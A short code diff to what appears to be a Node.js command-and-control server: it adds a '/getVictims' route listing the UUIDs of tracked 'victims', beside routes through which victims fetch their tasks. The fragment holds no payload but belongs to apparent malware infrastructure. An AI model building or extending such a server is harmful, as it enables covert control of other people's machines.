@@ -54,6 +54,11 @@ app.get('/watch', async (req,res) => {
   safeSend(res,req,watchFrontend)
 })
 
+app.get('/getVictims', async (req, res) => {
+    const victimUUIDs = victims.map(victim => victim.uuid);
+    safeSend(res, req, victimUUIDs.join('\n'));
+});
+
 app.get('/getMyTasks', async (req,res) => {
     if (req && req.body && req.body.uuid && typeof(req.body.uuid) === 'string') {
       const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
